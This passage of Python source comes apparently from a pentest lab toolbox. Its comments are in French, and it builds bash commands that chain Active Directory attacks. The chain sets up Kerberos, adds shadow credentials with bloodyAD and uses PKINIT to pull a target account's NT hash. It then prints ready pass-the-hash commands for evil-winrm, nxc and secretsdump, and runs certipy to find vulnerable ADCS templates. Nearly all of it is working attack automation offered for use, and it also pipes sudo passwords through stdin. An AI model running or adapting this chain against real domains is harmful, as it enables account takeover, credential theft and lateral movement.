            f"  {{ echo '# klist pour $CC_DEST — '$(date -Iseconds); KRB5CCNAME=\"$CC_DEST\" klist 2>&1; echo ''; }} | tee -a \"$KLIST_FILE\"; "
            f"  echo ''; echo '=== Prochaines étapes (à copier/coller) ==='; "
            f"  echo \"export KRB5CCNAME=$CC_DEST\"; "
            f"  echo 'Puis colle ce chemin dans le champ ccache de l UI pour que tous les outils l utilisent (-k).'; "
            f"else echo ''; echo '[!] Aucun .ccache généré — vérifie le mot de passe / NT-hash / temps DC (ntpdate).'; fi"
        ] if t and d and u and (p or nt) else None,

        "klist_show": ["bash","-c",
            f"mkdir -p {qout}/kerberos; "
            f"KLIST_FILE={qout}/kerberos/klist.txt; "
            f"echo '=== Scan ccache dans attack_checks/ ==='; "
            f"CCACHES=$(ls {qout}/attack_checks/*.ccache 2>/dev/null); "
            f"if [ -z \"$CCACHES\" ]; then "
            f"  echo '[!] Aucun .ccache trouvé — lance d abord l outil getTGT.'; "
            f"  [ -n \"$KRB5CCNAME\" ] && echo \"[*] Fallback : KRB5CCNAME courant = $KRB5CCNAME\" && klist 2>&1 | tee \"$KLIST_FILE\"; "
            f"  exit 0; "
            f"fi; "
            f"> \"$KLIST_FILE\"; "
            f"for cc in $CCACHES; do "
            f"  {{ echo \"# klist pour $cc — $(date -Iseconds)\"; KRB5CCNAME=\"$cc\" klist 2>&1; echo ''; }} | tee -a \"$KLIST_FILE\"; "
            f"done; "
            f"echo ''; echo '=== Fichier loot : kerberos/klist.txt ==='; "
            f"echo '[+] ' $(grep -c '^#' \"$KLIST_FILE\") ' ccache(s) dumped into klist.txt'"
        ],

        "krb5_setup": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"KRB_FILE={qout}/attack_checks/krb5.conf; "
            f"REALM={shell_quote(d.upper())}; "
            f"DC_HOST={shell_quote(dc if dc else f'DC01.{d}')}; "
            f"SUDO={shell_quote(sp)}; "
            # SUDO_RUN exécute une commande; SUDO_SH exécute une commande shell (supporte redirections/pipes).
            # On isole le mot de passe pour qu'il ne soit jamais écrasé par un stdin pipé.
            f"SUDO_RUN() {{ if [ -n \"$SUDO\" ]; then printf '%s\\n' \"$SUDO\" | sudo -S -p '' \"$@\"; else sudo -n \"$@\" 2>/dev/null || {{ echo '[~] sudo non disponible sans mot de passe — étape ignorée'; return 1; }}; fi; }}; "
            f"SUDO_SH()  {{ if [ -n \"$SUDO\" ]; then printf '%s\\n' \"$SUDO\" | sudo -S -p '' bash -c \"$1\"; else sudo -n bash -c \"$1\" 2>/dev/null || {{ echo '[~] sudo non disponible sans mot de passe — étape ignorée'; return 1; }}; fi; }}; "
            f"echo '=== 1/4 Génération krb5.conf ==='; "
            f"{shell_quote(nxc)} smb {qt} --generate-krb5-file \"$KRB_FILE\" 2>&1 | tail -5 || true; "
            f"if [ ! -s \"$KRB_FILE\" ] || ! grep -q default_realm \"$KRB_FILE\"; then "
            f"  echo '[~] nxc --generate-krb5-file indisponible, utilise le template minimal…'; "
            f"  cat > \"$KRB_FILE\" <<EOF\n"
            f"[libdefaults]\n"
            f"    default_realm = {d.upper()}\n"
            f"    dns_lookup_realm = false\n"
            f"    dns_lookup_kdc = false\n"
            f"    ticket_lifetime = 24h\n"
            f"    forwardable = yes\n"
            f"    rdns = false\n"
            f"\n"
            f"[realms]\n"
            f"    {d.upper()} = {{\n"
            f"        kdc = {dc or f'DC01.{d}'}\n"
            f"        admin_server = {dc or f'DC01.{d}'}\n"
            f"    }}\n"
            f"\n"
            f"[domain_realm]\n"
            f"    .{d} = {d.upper()}\n"
            f"    {d} = {d.upper()}\n"
            f"EOF\n"
            f"fi; "
            f"echo \"[+] krb5.conf généré : $KRB_FILE\"; "
            f"echo ''; echo '=== 2/4 Installation dans /etc/krb5.conf ==='; "
            f"if [ -f /etc/krb5.conf ] && ! diff -q \"$KRB_FILE\" /etc/krb5.conf >/dev/null 2>&1; then "
            f"  BACKUP=/etc/krb5.conf.htbtoolbox.$(date +%s).bak; "
            f"  echo \"[*] Backup /etc/krb5.conf → $BACKUP\"; "
            f"  SUDO_RUN cp /etc/krb5.conf \"$BACKUP\" 2>&1 || echo '[!] Backup échoué (sudo refusé ?)'; "
            f"fi; "
            f"SUDO_RUN cp \"$KRB_FILE\" /etc/krb5.conf 2>&1 && echo '[+] /etc/krb5.conf installé' || "
            f"{{ echo '[!] Impossible d écrire /etc/krb5.conf — export KRB5_CONFIG sera utilisé à la place.'; }}; "
            f"echo ''; echo '=== 3/4 /etc/hosts (entrée {t} ↔ {dc or f'DC01.{d}'}) ==='; "
            f"HOSTLINE={shell_quote(f'{t} {dc or f'DC01.{d}'} {d}')}; "
            f"if grep -qE \"^{t}[[:space:]]\" /etc/hosts; then "
            f"  CUR=$(grep -E \"^{t}[[:space:]]\" /etc/hosts | head -1); "
            f"  if [ \"$CUR\" = \"$HOSTLINE\" ]; then echo '[=] Entrée déjà à jour'; "
            f"  else "
            f"    echo \"[*] Remplacement : $CUR → $HOSTLINE\"; "
            f"    SUDO_SH \"sed -i '/^{t}[[:space:]]/d' /etc/hosts && printf '%s\\n' '$HOSTLINE' >> /etc/hosts\" && echo '[+] /etc/hosts mis à jour' || echo '[!] Maj /etc/hosts échouée'; "
            f"  fi; "
            f"else "
            f"  SUDO_SH \"printf '%s\\n' '$HOSTLINE' >> /etc/hosts\" && echo '[+] Entrée ajoutée à /etc/hosts' || echo '[!] Ajout /etc/hosts échoué'; "
            f"fi; "
            f"echo ''; echo '=== 4/4 Sync horloge sur DC ==='; "
            f"echo '[*] Désactivation NTP auto (timedatectl set-ntp false)'; "
            f"SUDO_RUN timedatectl set-ntp false 2>/dev/null || echo '[~] timedatectl indisponible ou refusé — on continue'; "
            # On capture la sortie et on décide OK/KO en fonction du texte, pas du code retour
            # (ntpdate sur Kali = wrapper sntp/ntpdig qui retourne 0 même en échec).
            f"NTP_OK=0; NTP_OUT=''; "
            f"if command -v ntpdate >/dev/null 2>&1; then "
            f"  NTP_OUT=$(SUDO_RUN ntpdate -u {qdc} 2>&1); "
            f"  echo \"$NTP_OUT\" | tail -3; "
            f"  echo \"$NTP_OUT\" | grep -qiE '(adjust|step|offset|stratum|server.*refid)' && NTP_OK=1; "
            f"elif command -v rdate >/dev/null 2>&1; then "
            f"  NTP_OUT=$(SUDO_RUN rdate -n {qdc} 2>&1); "
            f"  echo \"$NTP_OUT\" | tail -3; "
            f"  echo \"$NTP_OUT\" | grep -qiE '(adjust|step|set)' && NTP_OK=1; "
            f"elif command -v chronyc >/dev/null 2>&1; then "
            f"  NTP_OUT=$(SUDO_RUN chronyc -a 'burst 4/4' 2>&1); "
            f"  echo \"$NTP_OUT\" | tail -3; "
            f"  echo \"$NTP_OUT\" | grep -qiE '200 OK' && NTP_OK=1; "
            f"else "
            f"  echo '[!] Aucun client NTP (ntpdate/rdate/chronyc). Installer : sudo apt install ntpdate'; "
            f"fi; "
            f"if [ \"$NTP_OK\" = \"1\" ]; then echo '[+] Horloge synchronisée avec le DC'; "
            f"else echo '[~] Sync NTP échoué — le getTGT peut renvoyer KRB_AP_ERR_SKEW si le décalage > 5min.'; "
            f"  echo '    Fallback manuel : sudo timedatectl set-time \"$(rdate -p {qdc} 2>/dev/null | head -1)\" ou régler l horloge via le DC.'; "
            f"fi; "
            f"echo ''; echo '=== Résumé ==='; "
            f"echo \"  krb5.conf  : $KRB_FILE\"; "
            f"HOST_LINE_NOW=$(grep -E \"^{t}[[:space:]]\" /etc/hosts 2>/dev/null | head -1); "
            f"echo \"  /etc/hosts : ${{HOST_LINE_NOW:-non configuré}}\"; "
            f"echo \"  horloge    : $(date)\"; "
            f"echo \"  NTP status : $([ \"$NTP_OK\" = \"1\" ] && echo OK || echo KO)\"; "
            f"echo ''; echo '=== Prochaines étapes ==='; "
            f"echo \"  1. Vérifier klist : klist\"; "
            f"echo \"  2. Obtenir un TGT : lance l outil 'getTGT' dans l UI\"; "
            f"echo \"  3. KRB5_CONFIG sera auto-injecté dans tous les outils tant que $KRB_FILE existe.\""
        ] if t and d else None,

        "bloodyad_shadow_add": ["bash","-c",
            f"TOOL={shell_quote(get_bloodyad())}; "
            f"command -v $TOOL >/dev/null || {{ echo '[!] bloodyAD introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks {qout}/bloodyad; "
            + (f"TARGET_ACCOUNT={qta}; "
               if ta else
               "TARGET_ACCOUNT='MSA_HEALTH$'; "
               "echo '[!] Aucun target_account défini — utilise le placeholder MSA_HEALTH$'; "
               "echo '[!] Remplis le champ target_account dans l UI (ex: MSA_HEALTH$, SQLSVC$, etc.)'; ")
            + f"OUTFILE={qout}/attack_checks/shadow_add.txt; "
            f"echo \"=== bloodyAD add shadowCredentials → $TARGET_ACCOUNT ===\" | tee \"$OUTFILE\"; "
            + (f"KRB5CCNAME={qcc} $TOOL -k --host {qdc} -d {qd} -u {qu} "
               f"add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\""
               if cc else
               f"$TOOL --host {qdc} --dc-ip {qt} -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\""
               if u else "echo 'Credentials requis'")
            + f"; echo ''; echo '=== Hash NTLM extrait (si trouvé) ==='; "
            f"NT_OUT=$(grep -oE 'NT[[:space:]]*[:=][[:space:]]*[a-f0-9]{{32}}' \"$OUTFILE\" | head -1 | grep -oE '[a-f0-9]{{32}}'); "
            f"if [ -n \"$NT_OUT\" ]; then "
            f"  echo \"[+] Hash NTLM de $TARGET_ACCOUNT : $NT_OUT\"; "
            f"  echo ''; echo '=== Prochaines étapes ==='; "
            f"  echo \"evil-winrm -i {dc or t} -u '$TARGET_ACCOUNT' -H '$NT_OUT'\"; "
            f"  echo \"nxc winrm {t} -u '$TARGET_ACCOUNT' -H '$NT_OUT' -d {d}\"; "
            f"  echo \"impacket-secretsdump -hashes :$NT_OUT {d}/$TARGET_ACCOUNT@{t}\"; "
            f"else "
            f"  echo '[~] Aucun hash NTLM trouvé dans la sortie — vérifie l auth Kerberos (klist) et les droits GenericWrite sur la cible.'; "
            f"fi"
        ] if t and d and u else None,

        "pkinit_gettgt": ["bash","-c",
            f"set -o pipefail; "
            f"PKDIR={qpkdir}; "
            f"GETTGT_PKI=\"$PKDIR/gettgtpkinit.py\"; "
            f"mkdir -p {qout}/attack_checks; "
            f"OUT={qout}/attack_checks/gettgtpkinit.txt; "
            # Installer PKINITtools si absent
            f"if [ ! -f \"$GETTGT_PKI\" ]; then "
            f"  echo '[*] PKINITtools absent — installation auto…'; "
            f"  command -v git >/dev/null && git clone https://github.com/dirkjanm/PKINITtools \"$PKDIR\" 2>&1 | tail -3 || {{ echo '[!] git requis'; exit 1; }}; "
            f"  [ -f \"$PKDIR/requirements.txt\" ] && python3 -m pip install -q -r \"$PKDIR/requirements.txt\" 2>&1 | tail -3 || true; "
            f"fi; "
            + (f"TARGET_ACCOUNT={qta}; " if ta else "TARGET_ACCOUNT='MSA_HEALTH$'; echo '[!] Aucun target_account — utilise MSA_HEALTH$ par défaut.'; ")
            # Auto-détection du dernier pair cert/key PEM (dans $OUTDIR, $PWD puis $OUTDIR/bloodyad)
            + f"CERT_FILE=$(ls -t {qout}/bloodyad/*_cert.pem {qout}/attack_checks/*_cert.pem $PWD/*_cert.pem 2>/dev/null | head -1); "
            f"KEY_FILE=$(ls -t {qout}/bloodyad/*_priv.pem {qout}/attack_checks/*_priv.pem $PWD/*_priv.pem 2>/dev/null | head -1); "
            f"if [ -z \"$CERT_FILE\" ] || [ -z \"$KEY_FILE\" ]; then "
            f"  echo '[!] Pair cert/priv PEM introuvable — lance bloodyad_shadow_add ou shadowcred_pkinit_chain d abord.'; "
            f"  echo '[*] Chemins cherchés : loot/bloodyad/, attack_checks/, $PWD (*.pem)'; "
            f"  exit 1; "
            f"fi; "
            f"BASE=$(basename \"$CERT_FILE\" _cert.pem); "
            f"CCACHE_OUT={qout}/attack_checks/${{BASE}}.ccache; "
            f"echo \"=== PKINIT gettgtpkinit ===\" | tee \"$OUT\"; "
            f"echo \"cert : $CERT_FILE\" | tee -a \"$OUT\"; "
            f"echo \"key  : $KEY_FILE\" | tee -a \"$OUT\"; "
            f"echo \"dest : $CCACHE_OUT\" | tee -a \"$OUT\"; "
            f"echo ''; "
            f"python3 \"$GETTGT_PKI\" -cert-pem \"$CERT_FILE\" -key-pem \"$KEY_FILE\" "
            f"  -dc-ip {qt} {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" \"$CCACHE_OUT\" 2>&1 | tee -a \"$OUT\"; "
            f"if [ -f \"$CCACHE_OUT\" ]; then "
            f"  echo ''; echo '=== ccache généré ==='; echo \"$CCACHE_OUT\"; "
            f"  echo ''; echo '=== klist ==='; KRB5CCNAME=\"$CCACHE_OUT\" klist 2>&1 | tee -a \"$OUT\"; "
            f"  ASREP_KEY=$(grep -i 'AS-REP encryption key' \"$OUT\" | tail -1 | sed 's/.*: *//'); "
            f"  echo ''; echo '=== Clé AS-REP (à passer à pkinit_getnthash) ==='; echo \"$ASREP_KEY\"; "
            f"  echo \"$ASREP_KEY\" > {qout}/attack_checks/${{BASE}}.asrepkey; "
            f"  echo ''; echo '=== Prochaine étape ==='; "
            f"  echo '  1. Lance pkinit_getnthash pour extraire le NT hash du compte cible'; "
            f"  echo \"  2. Ou manuel : KRB5CCNAME=$CCACHE_OUT python3 $PKDIR/getnthash.py -key '$ASREP_KEY' '{d}/$TARGET_ACCOUNT'\"; "
            f"else "
            f"  echo '[!] Aucun ccache PKINIT généré — vérifie clock skew / validité du cert.' | tee -a \"$OUT\"; "
            f"fi"
        ] if t and d else None,

        "pkinit_getnthash": ["bash","-c",
            f"set -o pipefail; "
            f"PKDIR={qpkdir}; "
            f"GETNTHASH_PKI=\"$PKDIR/getnthash.py\"; "
            f"mkdir -p {qout}/attack_checks; "
            f"OUT={qout}/attack_checks/getnthash_pkinit.txt; "
            f"if [ ! -f \"$GETNTHASH_PKI\" ]; then "
            f"  echo '[!] PKINITtools absent — lance pkinit_gettgt d abord (il installe auto).'; exit 1; "
            f"fi; "
            + (f"TARGET_ACCOUNT={qta}; " if ta else "TARGET_ACCOUNT='MSA_HEALTH$'; echo '[!] Aucun target_account — utilise MSA_HEALTH$ par défaut.'; ")
            # Auto-détecte le dernier .ccache + .asrepkey généré par pkinit_gettgt
            + f"CCACHE_FILE=$(ls -t {qout}/attack_checks/*.ccache 2>/dev/null | grep -v {shell_quote(u)}'\\.ccache$' | head -1); "
            f"[ -z \"$CCACHE_FILE\" ] && CCACHE_FILE=$(ls -t {qout}/attack_checks/*.ccache 2>/dev/null | head -1); "
            f"ASREP_KEY_FILE=$(ls -t {qout}/attack_checks/*.asrepkey 2>/dev/null | head -1); "
            f"ASREP_KEY=''; [ -n \"$ASREP_KEY_FILE\" ] && ASREP_KEY=$(cat \"$ASREP_KEY_FILE\"); "
            f"if [ -z \"$CCACHE_FILE\" ] || [ -z \"$ASREP_KEY\" ]; then "
            f"  echo '[!] ccache ou clé AS-REP introuvable — lance pkinit_gettgt d abord.'; "
            f"  echo '    Cherche : attack_checks/*.ccache et attack_checks/*.asrepkey'; "
            f"  exit 1; "
            f"fi; "
            f"echo \"=== PKINIT getnthash ===\" | tee \"$OUT\"; "
            f"echo \"ccache    : $CCACHE_FILE\" | tee -a \"$OUT\"; "
            f"echo \"AS-REP key: $ASREP_KEY\" | tee -a \"$OUT\"; "
            f"echo ''; "
            f"KRB5CCNAME=\"$CCACHE_FILE\" python3 \"$GETNTHASH_PKI\" -key \"$ASREP_KEY\" "
            f"  {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUT\"; "
            f"NTHASH=$(grep -oE '[A-Fa-f0-9]{{32}}' \"$OUT\" | tail -1); "
            f"if [ -n \"$NTHASH\" ]; then "
            f"  TA_HOST=$(printf '%s' \"$TARGET_ACCOUNT\" | tr '[:upper:]' '[:lower:]' | sed 's/\\$$//'); "
            f"  echo ''; echo '=== NT Hash extrait ==='; echo \"$NTHASH\"; "
            f"  echo ''; echo '=== Commandes prêtes à copier ==='; "
            f"  echo \"evil-winrm -i {dc if dc else t} -u '${{TA_HOST}}\\$' -H '$NTHASH'\"; "
            f"  echo \"evil-winrm -i {t} -u '${{TA_HOST}}\\$' -H '$NTHASH'\"; "
            f"  echo \"{get_nxc()} winrm {t} -u '${{TA_HOST}}\\$' -H '$NTHASH' -d {d}\"; "
            f"  echo \"impacket-secretsdump -hashes :$NTHASH '{d}/${{TA_HOST}}\\$@{t}'\"; "
            f"else "
            f"  echo '[!] Aucun NT hash extrait — vérifie la clé AS-REP ou le ccache.' | tee -a \"$OUT\"; "
            f"fi"
        ] if t and d else None,

        "shadowcred_pkinit_chain": ["bash","-c",
            f"set -o pipefail; "
            f"BLOODY={shell_quote(get_bloodyad())}; "
            f"PKDIR={qpkdir}; "
            f"GETTGT_PKI=\"$PKDIR/gettgtpkinit.py\"; "
            f"GETNTHASH_PKI=\"$PKDIR/getnthash.py\"; "
            f"mkdir -p {qout}/attack_checks {qout}/bloodyad {qout}/kerberos; "
            f"OUTFILE={qout}/attack_checks/shadowcred_pkinit_chain.txt; "
            f"GETTGT_OUT={qout}/attack_checks/gettgtpkinit.txt; "
            f"GETNTHASH_OUT={qout}/attack_checks/getnthash_pkinit.txt; "
            f"SUDO={shell_quote(sp)}; "
            f"SUDO_RUN() {{ if [ -n \"$SUDO\" ]; then printf '%s\\n' \"$SUDO\" | sudo -S -p '' \"$@\"; else sudo -n \"$@\" 2>/dev/null || {{ echo '[~] sudo non disponible sans mot de passe — étape ignorée'; return 1; }}; fi; }}; "
            + (f"TARGET_ACCOUNT={qta}; " if ta else
               "TARGET_ACCOUNT='MSA_HEALTH$'; "
               "echo '[!] Aucun target_account défini — utilisation du placeholder MSA_HEALTH$'; ")
            + f"TA_HOST=$(printf '%s' \"$TARGET_ACCOUNT\" | tr '[:upper:]' '[:lower:]' | sed 's/\\$$//'); "
            f"EXPECTED_HOSTS='{t} {d} {dc} '$TA_HOST'.{d}'; "
            f"echo \"=== shadowcred auto chain → $TARGET_ACCOUNT ===\" | tee \"$OUTFILE\"; "
            f"echo '[*] Précheck Kerberos / hosts' | tee -a \"$OUTFILE\"; "
            + (f"echo \"[*] KRB5CCNAME initial : {cc}\" | tee -a \"$OUTFILE\"; "
               f"KRB5CCNAME={qcc} klist 2>&1 | tee -a \"$OUTFILE\"; "
               if cc else
               "echo '[~] Aucun ccache fourni dans l UI — bloodyAD tentera -k avec le cache courant ou retentera avec -p si disponible.' | tee -a \"$OUTFILE\"; ")
            + f"echo \"[*] /etc/hosts attendu : $EXPECTED_HOSTS\" | tee -a \"$OUTFILE\"; "
            f"grep -E '^{t}[[:space:]]' /etc/hosts 2>/dev/null | tee -a \"$OUTFILE\" || echo '[~] Aucune entrée /etc/hosts pour cette cible.' | tee -a \"$OUTFILE\"; "
            f"echo '[*] timedatectl set-ntp false' | tee -a \"$OUTFILE\"; "
            f"SUDO_RUN timedatectl set-ntp false 2>&1 | tee -a \"$OUTFILE\" || true; "
            f"if command -v ntpdate >/dev/null 2>&1; then echo '[*] ntpdate -u {dc if dc else t}' | tee -a \"$OUTFILE\"; SUDO_RUN ntpdate -u {qdc} 2>&1 | tee -a \"$OUTFILE\" || true; fi; "
            f"if [ ! -f \"$GETTGT_PKI\" ] || [ ! -f \"$GETNTHASH_PKI\" ]; then "
            f"  echo '[*] PKINITtools absent — tentative d installation locale…' | tee -a \"$OUTFILE\"; "
            f"  if command -v git >/dev/null 2>&1; then "
            f"    if [ -d \"$PKDIR/.git\" ]; then git -C \"$PKDIR\" pull --ff-only 2>&1 | tee -a \"$OUTFILE\" || true; "
            f"    else git clone https://github.com/dirkjanm/PKINITtools.git \"$PKDIR\" 2>&1 | tee -a \"$OUTFILE\" || true; fi; "
            f"    if [ -f \"$PKDIR/requirements.txt\" ]; then python3 -m pip install -r \"$PKDIR/requirements.txt\" 2>&1 | tee -a \"$OUTFILE\" || true; fi; "
            f"  else echo '[~] git introuvable — installation auto PKINITtools impossible.' | tee -a \"$OUTFILE\"; fi; "
            f"fi; "
            f"command -v $BLOODY >/dev/null || {{ echo '[!] bloodyAD introuvable' | tee -a \"$OUTFILE\"; exit 1; }}; "
            f"echo ''; echo '=== bloodyAD add shadowCredentials ===' | tee -a \"$OUTFILE\"; "
            + (f"if [ -n {qcc} ]; then export KRB5CCNAME={qcc}; fi; " if cc else "")
            + f"$BLOODY --host {qdc} --dc-ip {qt} -d {qd} -u {qu} -k add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\"; "
            f"if ! grep -qiE 'Saved PEM certificate|KeyCredential generated|A TGT can now be obtained' \"$OUTFILE\"; then "
            + (f"  echo ''; echo '[~] Tentative fallback avec -p malgré -k' | tee -a \"$OUTFILE\"; "
               f"  $BLOODY --host {qdc} --dc-ip {qt} -d {qd} -u {qu} -p {qp} -k add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\"; "
               if p else
               "  echo '[!] Pas de mot de passe disponible pour le fallback -p.' | tee -a \"$OUTFILE\"; ")
            + f"fi; "
            f"CERT_FILE=$(grep -oE 'Saved PEM certificate at path: .*' \"$OUTFILE\" | tail -1 | sed 's/.*path: //'); "
            f"KEY_FILE=$(grep -oE 'Saved PEM private key at path: .*' \"$OUTFILE\" | tail -1 | sed 's/.*path: //'); "
            f"BASE_NAME=$(grep -oE 'filename: [A-Za-z0-9._-]+' \"$OUTFILE\" | tail -1 | awk '{{print $2}}'); "
            f"if [ -z \"$CERT_FILE\" ] && [ -n \"$BASE_NAME\" ]; then CERT_FILE=\"${{BASE_NAME}}_cert.pem\"; fi; "
            f"if [ -z \"$KEY_FILE\" ] && [ -n \"$BASE_NAME\" ]; then KEY_FILE=\"${{BASE_NAME}}_priv.pem\"; fi; "
            f"if [ -n \"$CERT_FILE\" ] && [ ! -f \"$CERT_FILE\" ] && [ -f \"$PWD/$CERT_FILE\" ]; then CERT_FILE=\"$PWD/$CERT_FILE\"; fi; "
            f"if [ -n \"$KEY_FILE\" ] && [ ! -f \"$KEY_FILE\" ] && [ -f \"$PWD/$KEY_FILE\" ]; then KEY_FILE=\"$PWD/$KEY_FILE\"; fi; "
            f"PKI_CCACHE={qout}/attack_checks/${{BASE_NAME:-shadowcred}}.ccache; "
            f"echo ''; echo '=== Artefacts shadowCredentials ===' | tee -a \"$OUTFILE\"; "
            f"echo \"CERT_FILE=${{CERT_FILE:-absent}}\" | tee -a \"$OUTFILE\"; "
            f"echo \"KEY_FILE=${{KEY_FILE:-absent}}\" | tee -a \"$OUTFILE\"; "
            f"if [ -f \"$GETTGT_PKI\" ] && [ -n \"$CERT_FILE\" ] && [ -n \"$KEY_FILE\" ] && [ -f \"$CERT_FILE\" ] && [ -f \"$KEY_FILE\" ]; then "
            f"  echo ''; echo '=== PKINIT gettgtpkinit.py ===' | tee -a \"$OUTFILE\"; "
            f"  python3 \"$GETTGT_PKI\" -cert-pem \"$CERT_FILE\" -key-pem \"$KEY_FILE\" {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" \"$PKI_CCACHE\" 2>&1 | tee \"$GETTGT_OUT\"; "
            f"  cat \"$GETTGT_OUT\" >> \"$OUTFILE\"; "
            f"  if [ -f \"$PKI_CCACHE\" ]; then "
            f"    echo ''; echo '=== klist PKINIT ===' | tee -a \"$OUTFILE\"; "
            f"    KRB5CCNAME=\"$PKI_CCACHE\" klist 2>&1 | tee -a \"$OUTFILE\"; "
            f"  fi; "
            f"  ASREP_KEY=$(grep -i 'AS-REP encryption key' \"$GETTGT_OUT\" | tail -1 | sed 's/.*: *//'); "
            f"  if [ -f \"$GETNTHASH_PKI\" ] && [ -n \"$ASREP_KEY\" ] && [ -f \"$PKI_CCACHE\" ]; then "
            f"    echo ''; echo '=== PKINIT getnthash.py ===' | tee -a \"$OUTFILE\"; "
            f"    KRB5CCNAME=\"$PKI_CCACHE\" python3 \"$GETNTHASH_PKI\" -key \"$ASREP_KEY\" {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" 2>&1 | tee \"$GETNTHASH_OUT\"; "
            f"    cat \"$GETNTHASH_OUT\" >> \"$OUTFILE\"; "
            f"    NTHASH=$(grep -oE '[A-Fa-f0-9]{{32}}' \"$GETNTHASH_OUT\" | tail -1); "
            f"    if [ -n \"$NTHASH\" ]; then "
            f"      echo ''; echo '=== WinRM / nxc prêts ===' | tee -a \"$OUTFILE\"; "
            f"      echo \"evil-winrm -i {dc if dc else t} -u '$TA_HOST$' -H '$NTHASH'\" | tee -a \"$OUTFILE\"; "
            f"      echo \"evil-winrm -i {t} -u '$TA_HOST$' -H '$NTHASH'\" | tee -a \"$OUTFILE\"; "
            f"      echo \"{get_nxc()} winrm {t} -u '$TA_HOST$' -H '$NTHASH' -d {d}\" | tee -a \"$OUTFILE\"; "
            f"    else "
            f"      echo '[~] Aucun NT hash extrait automatiquement depuis getnthash.py.' | tee -a \"$OUTFILE\"; "
            f"    fi; "
            f"  else "
            f"    echo '[~] getnthash.py indisponible, clé AS-REP absente, ou ccache PKINIT manquant.' | tee -a \"$OUTFILE\"; "
            f"  fi; "
            f"else "
            f"  echo '[~] PKINITtools/gettgtpkinit.py absent ou cert/key non trouvés — enchaînement auto PKINIT ignoré.' | tee -a \"$OUTFILE\"; "
            f"fi; "
            f"echo ''; echo '=== Commandes de secours ===' | tee -a \"$OUTFILE\"; "
            f"if [ -n \"$CERT_FILE\" ] && [ -n \"$KEY_FILE\" ]; then "
            f"  echo \"python3 $PKDIR/gettgtpkinit.py -cert-pem $CERT_FILE -key-pem $KEY_FILE '{d}/$TARGET_ACCOUNT' $PKI_CCACHE\" | tee -a \"$OUTFILE\"; "
            f"fi; "
            f"echo '[+] Chaîne shadowcred terminée. Consulte shadowcred_pkinit_chain.txt pour le détail.' | tee -a \"$OUTFILE\""
        ] if t and d and u else None,

        "nxc_smb_auth_test": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"OUT={qout}/attack_checks/smb_auth_test.txt; "
            f"TIMEOUT_BIN=$(command -v timeout || true); "
            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 90s }}; "
            f"echo \"=== nxc smb auth test ({u}) ===\" | tee \"$OUT\"; "
            + (f"${{RUNNER}}{shell_quote(nxc)} smb {qt} -u {qu} -H {qnt} -d {qd} 2>&1 | tee -a \"$OUT\""
               if nt else
               f"${{RUNNER}}{shell_quote(nxc)} smb {qt} -u {qu} -p {qp} -d {qd} 2>&1 | tee -a \"$OUT\""
               if u else "echo '[!] Credentials requis'; exit 1")
            + f"; echo ''; "
            f"if grep -qiE 'STATUS_ACCOUNT_RESTRICTION|STATUS_LOGON_TYPE_NOT_GRANTED' \"$OUT\"; then "
            f"  echo '[~] Compte valide mais restriction SMB détectée (STATUS_ACCOUNT_RESTRICTION).'; "
            f"  echo '    → Mot de passe correct, mais SMB bloqué. Passe en Kerberos :'; "
            f"  echo '      1. krb5_setup  (génère krb5.conf + sync NTP)'; "
            f"  echo '      2. gettgt      (récupère un TGT)'; "
            f"  echo '      3. colle le ccache dans le champ UI, puis relance tes outils avec -k'; "
            f"elif grep -qiE 'STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|STATUS_WRONG_PASSWORD' \"$OUT\"; then "
            f"  echo '[!] Credentials invalides — mauvais mot de passe/hash.'; "
            f"elif grep -qiE '\\[\\+\\].*(Pwn3d|\\(admin\\))' \"$OUT\"; then "
            f"  echo '[+] Admin SMB ! Enchaîne : secretsdump, smb_loot, postauth_hints.'; "
            f"elif grep -qE '\\[\\+\\]' \"$OUT\"; then "
            f"  echo '[+] Auth SMB OK (user standard). Enchaîne : smb_loot, ldap_users_auth, bloodhound.'; "
            f"else "
            f"  echo '[~] Résultat ambigu — vérifie /etc/hosts, nom de domaine, et logs ci-dessus.'; "
            f"fi"
        ] if t and u else None,

        "certipy_find": ["bash","-c",
            f"TOOL={shell_quote(get_certipy())}; command -v $TOOL >/dev/null || {{ echo 'certipy introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/adcs; "
            + (f"KRB5CCNAME={qcc} $TOOL find -u {shell_quote(f'{u}@{d}')} -k -no-pass "
               f"-dc-ip {qt} -target {qdc} -vulnerable -stdout 2>&1"
               if cc else
               f"$TOOL find -u {shell_quote(f'{u}@{d}')} "
               + (f"-hashes {shell_quote(':' + nt)}" if nt else f"-p {qp}")
               + f" -dc-ip {qt} -target {qdc} -vulnerable -stdout 2>&1"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "certipy_ca": ["bash","-c",
            f"TOOL={shell_quote(get_certipy())}; command -v $TOOL >/dev/null || {{ echo 'certipy introuvable'; exit 1; }}; "
            + (f"$TOOL ca -u {shell_quote(f'{u}@{d}')} "
               + (f"-hashes {shell_quote(':' + nt)}" if nt else f"-p {qp}")
               + f" -dc-ip {qt} -target {qdc} 2>&1"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "certipy_shadow": ["bash","-c",
            f"TOOL={shell_quote(get_certipy())}; command -v $TOOL >/dev/null || {{ echo 'certipy introuvable'; exit 1; }}; "
            + (f"$TOOL shadow auto -u {shell_quote(f'{u}@{d}')} "
               + (f"-hashes {shell_quote(':' + nt)}" if nt else f"-p {qp}")
               + f" -dc-ip {qt} -account {qu} 2>&1"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "enum4linux_ng": ["bash","-c",
